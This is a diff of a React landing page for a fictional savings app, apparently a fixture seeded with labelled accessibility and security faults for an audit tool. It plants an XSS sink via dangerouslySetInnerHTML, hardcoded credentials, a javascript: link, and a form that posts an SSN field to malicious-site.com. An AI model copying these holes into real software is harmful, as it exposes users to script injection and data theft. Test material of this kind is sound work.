@@ -1,102 +1,11 @@
-import { useState, useEffect, lazy, Suspense } from "react";
-import {
-  HeaderSection,
-  HeroSection,
-  QuickActionsSection,
-  InteractiveCardSection,
-  PricingSection,
-  ServiceStatusSection,
-  FooterSection,
-} from "@/components/sections/index";
-
-// Lazy-loaded below-the-fold sections for improved initial page load performance
-const LazyFeaturesSection = lazy(() => import("@/components/sections/LazyFeaturesSection"));
-const LazyHowItWorksSection = lazy(() => import("@/components/sections/LazyHowItWorksSection"));
-
-// Skeleton loader component to prevent CLS while lazy sections load
-const SectionSkeleton = ({ minHeight = "400px" }: { minHeight?: string }) => (
-  <div
-    className="w-full animate-pulse bg-secondary/20"
-    style={{ minHeight }}
-    aria-label="Loading content..."
-    role="status"
-  >
-    <div className="container mx-auto px-6 py-20">
-      <div className="h-8 bg-secondary/40 rounded w-64 mx-auto mb-4" />
-      <div className="h-4 bg-secondary/40 rounded w-96 mx-auto mb-16 max-w-full" />
-      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
-        {[1, 2, 3, 4].map((i) => (
-          <div key={i} className="h-48 bg-secondary/40 rounded-xl" />
-        ))}
-      </div>
-    </div>
-  </div>
-);
-
-// PERFORMANCE ISSUE: Heavy synchronous computation that blocks main thread
-const heavyComputation = () => {
-  let result = 0;
-  for (let i = 0; i < 50000000; i++) {
-    result += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
-  }
-  return result;
-};
-
-// PERFORMANCE ISSUE: Generate massive inline data
-const generateLargeData = () => {
-  const data = [];
-  for (let i = 0; i < 10000; i++) {
-    data.push({
-      id: i,
-      name: `Item ${i}`,
-      description: `This is a very long description for item ${i} that contains lots of unnecessary text to bloat the page size and slow down rendering. `.repeat(5),
-      metadata: {
-        created: new Date().toISOString(),
-        updated: new Date().toISOString(),
-        tags: Array(20).fill(`tag-${i}`),
-      }
-    });
-  }
-  return data;
-};
+import { useState } from "react";
+import { Button } from "@/components/ui/button";
+import { PiggyBank, TrendingUp, Shield, Zap, ChevronRight, Star, Users, DollarSign } from "lucide-react";
+import heroPhone from "@/assets/hero-phone.png";
 
 const Index = () => {
   const [userInput, setUserInput] = useState("");
   const [submittedData, setSubmittedData] = useState("");
-  const [isLoading, setIsLoading] = useState(true);
-  const [heavyData, setHeavyData] = useState<any[]>([]);
-
-  // PERFORMANCE ISSUE: Multiple blocking operations on mount
-  useEffect(() => {
-    // Synchronous heavy computation blocking render
-    console.log("Starting heavy computation...");
-    const computeResult = heavyComputation();
-    console.log("Heavy computation result:", computeResult);
-
-    // Generate massive data
-    const largeData = generateLargeData();
-    setHeavyData(largeData);
-
-    // Artificial delay simulating slow API calls
-    const delays = [800, 1200, 1500, 2000];
-
-    Promise.all(
-      delays.map(delay =>
-        new Promise(resolve => setTimeout(resolve, delay))
-      )
-    ).then(() => {
-      // Another heavy computation after delays
-      heavyComputation();
-      setIsLoading(false);
-    });
-
-    // PERFORMANCE ISSUE: Unnecessary re-renders with interval
-    const interval = setInterval(() => {
-      heavyComputation();
-    }, 3000);
-
-    return () => clearInterval(interval);
-  }, []);
 
   // SECURITY VIOLATION: Storing sensitive data in localStorage without encryption
   const saveToLocalStorage = () => {
@@ -113,78 +22,279 @@ const Index = () => {
     saveToLocalStorage();
   };
 
-  // PERFORMANCE ISSUE: Show loading state with artificial delay
-  if (isLoading) {
-    return (
-      <div className="min-h-screen bg-background dark flex items-center justify-center">
-        <div className="text-center">
-          <div className="animate-spin w-16 h-16 border-4 border-primary border-t-transparent rounded-full mx-auto mb-4"></div>
-          <p className="text-muted-foreground">Loading application...</p>
-          <p className="text-xs text-muted-foreground mt-2">Processing {heavyData.length.toLocaleString()} items...</p>
-        </div>
-      </div>
-    );
-  }
-
   return (
     <div className="min-h-screen bg-background dark">
-      {/* Skip link for accessibility */}
-      <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-[100] focus:px-4 focus:py-2 focus:bg-primary focus:text-primary-foreground focus:rounded">
-        Skip to main content
-      </a>
-
-      {/* PERFORMANCE ISSUE: Render massive hidden data in DOM */}
-      <div style={{ display: 'none' }}>
-        {heavyData.map((item, index) => (
-          <div key={index} data-item={JSON.stringify(item)}>
-            {item.description}
-          </div>
-        ))}
-      </div>
+      {/* WCAG: Missing skip link */}
 
       {/* Header */}
-      <HeaderSection />
+      <header className="fixed top-0 left-0 right-0 z-50 glass-card">
+        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <PiggyBank className="w-8 h-8 text-primary" />
+            {/* WCAG: Improper heading hierarchy - h4 in header before h1 */}
+            <h4 className="text-xl font-bold text-foreground">SaveSmart</h4>
+          </div>
+          <nav className="hidden md:flex items-center gap-8">
+            {/* WCAG: Link with no href */}
+            <a className="text-muted-foreground hover:text-foreground transition-colors">Features</a>
+            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">Pricing</a>
+            {/* WCAG: Empty link */}
+            <a href="/about"></a>
+            {/* WCAG: Non-descriptive link text */}
+            <a href="/details" className="text-muted-foreground hover:text-foreground transition-colors">Click here</a>
+          </nav>
+          <Button className="bg-primary text-primary-foreground hover:bg-primary/90">
+            Get Started
+          </Button>
+        </div>
+      </header>
 
-      {/* Main content area */}
-      <main id="main-content">
-        {/* Hero Section */}
-        <HeroSection
-          userInput={userInput}
-          setUserInput={setUserInput}
-          submittedData={submittedData}
-          handleSubmit={handleSubmit}
+      {/* Hero Section */}
+      <section className="pt-32 pb-20 px-6">
+        <div className="container mx-auto text-center">
+          {/* WCAG: h1 comes after h4 - improper hierarchy */}
+          <h1 className="text-5xl md:text-7xl font-bold mb-6 animate-fade-in">
+            <span className="text-foreground">Save Money</span>
+            <br />
+            <span className="gradient-text">Effortlessly</span>
+          </h1>
+
+          {/* WCAG: Low contrast text */}
+          <p style={{ color: "#666", backgroundColor: "#777" }} className="text-xl max-w-2xl mx-auto mb-8 inline-block px-4 py-2 rounded">
+            Important information that's hard to read
+          </p>
+
+          <p className="text-xl text-muted-foreground max-w-2xl mx-auto mb-10 animate-fade-in" style={{ animationDelay: "0.2s" }}>
+            The smart way to build your savings. Automated, intelligent, and designed for your financial success.
+          </p>
+
+          {/* WCAG: Image without alt text */}
+          <div className="flex justify-center mb-8">
+            <img src={heroPhone} width="280" className="animate-float drop-shadow-2xl" />
+          </div>
+
+          <div className="flex flex-col sm:flex-row gap-4 justify-center animate-fade-in" style={{ animationDelay: "0.4s" }}>
+            <Button size="lg" className="bg-primary text-primary-foreground hover:bg-primary/90 text-lg px-8">
+              Start Saving Now <ChevronRight className="ml-2 w-5 h-5" />
+            </Button>
+            <Button size="lg" variant="outline" className="text-lg px-8">
+              Watch Demo
+            </Button>
+          </div>
+
+          {/* WCAG: Duplicate IDs */}
+          <div id="main-content" className="mt-16">
+            <div id="main-content" className="glass-card rounded-2xl p-8 max-w-md mx-auto">
+              {/* WCAG: Form without labels */}
+              <div className="space-y-4">
+                <input
+                  type="email"
+                  placeholder="Enter your email"
+                  className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border focus:ring-2 focus:ring-primary outline-none"
+                  value={userInput}
+                  onChange={(e) => setUserInput(e.target.value)}
+                />
+                {/* WCAG: Input with aria-hidden but still focusable */}
+                <input
+                  type="password"
+                  placeholder="Password"
+                  aria-hidden="true"
+                  className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
+                />
+
+                {/* WCAG: Button without accessible name */}
+                <button onClick={handleSubmit} className="w-full p-3 bg-primary rounded-lg text-primary-foreground">
+                  <svg width="20" height="20" viewBox="0 0 20 20" className="mx-auto">
+                    <path d="M10 3L17 10L10 17M17 10H3" stroke="currentColor" strokeWidth="2" fill="none" />
+                  </svg>
+                </button>
+              </div>
+
+              {/* SECURITY VIOLATION: Rendering user input with dangerouslySetInnerHTML (XSS vulnerability) */}
+              {submittedData && (
+                <div
+                  className="mt-4 p-4 bg-secondary rounded-lg"
+                  dangerouslySetInnerHTML={{ __html: submittedData }}
+                />
+              )}
+
+              {/* SECURITY VIOLATION: Hardcoded credentials in HTML */}
+              <div className="hidden">
+                <span data-api-key="sk-secret-key-12345"></span>
+                <span data-password="admin123"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Features Section */}
+      <section className="py-20 px-6 bg-secondary/30">
+        <div className="container mx-auto">
+          <h2 className="text-4xl font-bold text-center mb-4 text-foreground">Why Choose SaveSmart?</h2>
+          <p className="text-muted-foreground text-center mb-16 max-w-2xl mx-auto">
+            Powerful features designed to help you reach your financial goals faster.
+          </p>
+
+          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+            {[
+              { icon: TrendingUp, title: "Smart Analytics", desc: "AI-powered insights into your spending patterns" },
+              { icon: Shield, title: "Bank-Level Security", desc: "256-bit encryption keeps your data safe" },
+              { icon: Zap, title: "Instant Transfers", desc: "Move money in seconds, not days" },
+              { icon: PiggyBank, title: "Auto-Savings", desc: "Set rules to save automatically" },
+            ].map((feature, index) => (
+              <div key={index} className="glass-card rounded-xl p-6 hover:scale-105 transition-transform">
+                <feature.icon className="w-12 h-12 text-primary mb-4" />
+                <h3 className="text-xl font-semibold mb-2 text-foreground">{feature.title}</h3>
+                <p className="text-muted-foreground">{feature.desc}</p>
+              </div>
+            ))}
+          </div>
+        </div>
+
+        {/* WCAG: Auto-playing content without controls - marquee */}
+        <div
+          className="mt-12 text-primary font-semibold"
+          dangerouslySetInnerHTML={{ __html: '<marquee>🎉 Special offer! Limited time only - Get 3 months free! 🎉</marquee>' }}
         />
+      </section>
 
-        {/* Features Section - Lazy Loaded */}
-        <Suspense fallback={<SectionSkeleton minHeight="480px" />}>
-          <LazyFeaturesSection />
-        </Suspense>
+      {/* Stats Section */}
+      <section className="py-20 px-6">
+        <div className="container mx-auto">
+          <div className="grid md:grid-cols-3 gap-8 text-center">
+            {[
+              { icon: Users, value: "500K+", label: "Active Users" },
+              { icon: DollarSign, value: "$2.5B", label: "Saved by Users" },
+              { icon: Star, value: "4.9/5", label: "App Store Rating" },
+            ].map((stat, index) => (
+              <div key={index} className="glass-card rounded-2xl p-8">
+                <stat.icon className="w-10 h-10 text-primary mx-auto mb-4" />
+                <div className="text-4xl font-bold text-foreground mb-2">{stat.value}</div>
+                <div className="text-muted-foreground">{stat.label}</div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </section>
 
-        {/* Stats Section - Lazy Loaded */}
-        <Suspense fallback={<SectionSkeleton minHeight="300px" />}>
-          <LazyHowItWorksSection />
-        </Suspense>
+      {/* WCAG: Positive tabindex disrupting natural tab order */}
+      <section className="py-12 px-6 bg-secondary/30">
+        <div className="container mx-auto text-center">
+          <h2 className="text-3xl font-bold mb-8 text-foreground">Quick Actions</h2>
+          <div className="flex justify-center gap-4 flex-wrap">
+            <Button tabIndex={5} variant="outline">First Action</Button>
+            <Button tabIndex={1} variant="outline">Second Action</Button>
+            <Button tabIndex={3} variant="outline">Third Action</Button>
+          </div>
+        </div>
+      </section>
 
-        {/* WCAG: Positive tabindex disrupting natural tab order */}
-        <QuickActionsSection />
+      {/* WCAG: onclick on non-interactive element without keyboard support */}
+      <section className="py-12 px-6">
+        <div className="container mx-auto">
+          <div
+            className="glass-card rounded-2xl p-8 text-center cursor-pointer hover:scale-[1.02] transition-transform"
+            onClick={() => alert("Clicked!")}
+          >
+            <h2 className="text-2xl font-bold text-foreground mb-2">Click this card!</h2>
+            <p className="text-muted-foreground">This div has onClick but no keyboard support</p>
+          </div>
+        </div>
+      </section>
 
-        {/* Interactive card section */}
-        <InteractiveCardSection />
+      {/* WCAG: Table without proper headers */}
+      <section className="py-12 px-6 bg-secondary/30">
+        <div className="container mx-auto">
+          <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Pricing Plans</h2>
+          <table className="w-full max-w-2xl mx-auto glass-card rounded-xl overflow-hidden">
+            <tr className="border-b border-border">
+              <td className="p-4 text-foreground">Plan</td>
+              <td className="p-4 text-foreground">Price</td>
+              <td className="p-4 text-foreground">Features</td>
+            </tr>
+            <tr className="border-b border-border">
+              <td className="p-4 text-muted-foreground">Basic</td>
+              <td className="p-4 text-muted-foreground">$9.99/mo</td>
+              <td className="p-4 text-muted-foreground">5 savings goals</td>
+            </tr>
+            <tr>
+              <td className="p-4 text-muted-foreground">Pro</td>
+              <td className="p-4 text-muted-foreground">$19.99/mo</td>
+              <td className="p-4 text-muted-foreground">Unlimited goals</td>
+            </tr>
+          </table>
+        </div>
+      </section>
 
-        {/* Pricing table with semantic HTML for accessibility */}
-        <PricingSection />
+      {/* SECURITY VIOLATION: Link with javascript: protocol */}
+      <section className="py-12 px-6">
+        <div className="container mx-auto text-center">
+          <a href="javascript:alert('XSS')" className="text-primary hover:underline text-lg">
+            Click for a surprise! 🎁
+          </a>
+        </div>
+      </section>
 
-        {/* Service Status with text labels for accessibility */}
-        <ServiceStatusSection />
+      {/* SECURITY VIOLATION: Form submitting to external URL without CSRF protection */}
+      <section className="py-12 px-6 bg-secondary/30">
+        <div className="container mx-auto">
+          <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto glass-card rounded-xl p-8">
+            <h3 className="text-xl font-bold mb-4 text-foreground">Verify Your Identity</h3>
+            <input type="hidden" name="stolen_data" value="sensitive-info" />
+            <input
+              type="text"
+              name="ssn"
+              placeholder="Enter SSN"
+              className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border mb-4"
+            />
+            <Button type="submit" className="w-full bg-destructive text-destructive-foreground hover:bg-destructive/90">
+              Submit
+            </Button>
+          </form>
+        </div>
+      </section>
 
-        {/* Accessible text using relative units (rem) */}
-        <p className="text-xs text-center text-muted-foreground py-4">
-          This text uses relative units and can be resized by browser settings
-        </p>
-      </main>
+      {/* WCAG: Color as only indicator */}
+      <section className="py-12 px-6">
+        <div className="container mx-auto">
+          <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Service Status</h2>
+          <div className="flex justify-center gap-8">
+            <div className="flex items-center gap-2">
+              <span className="inline-block w-4 h-4 rounded-full bg-green-500"></span>
+              <span className="text-foreground">API</span>
+            </div>
+            <div className="flex items-center gap-2">
+              <span className="inline-block w-4 h-4 rounded-full bg-red-500"></span>
+              <span className="text-foreground">Payments</span>
+            </div>
+            <div className="flex items-center gap-2">
+              <span className="inline-block w-4 h-4 rounded-full bg-yellow-500"></span>
+              <span className="text-foreground">Sync</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* WCAG: Text that cannot be resized (uses px) */}
+      <p style={{ fontSize: "10px" }} className="text-center text-muted-foreground py-4">
+        This tiny text uses absolute pixels and cannot be resized by browser settings
+      </p>
 
       {/* Footer */}
-      <FooterSection />
+      <footer className="py-12 px-6 bg-card border-t border-border">
+        <div className="container mx-auto text-center">
+          <div className="flex items-center justify-center gap-2 mb-4">
+            <PiggyBank className="w-6 h-6 text-primary" />
+            <span className="text-lg font-bold text-foreground">SaveSmart</span>
+          </div>
+          <p className="text-muted-foreground mb-4">© 2024 SaveSmart. All rights reserved.</p>
+          {/* WCAG: Link opens in new window without warning */}
+          <a href="https://example.com" target="_blank" className="text-primary hover:underline">
+            External Link
+          </a>
+        </div>
+      </footer>
     </div>
   );
 };
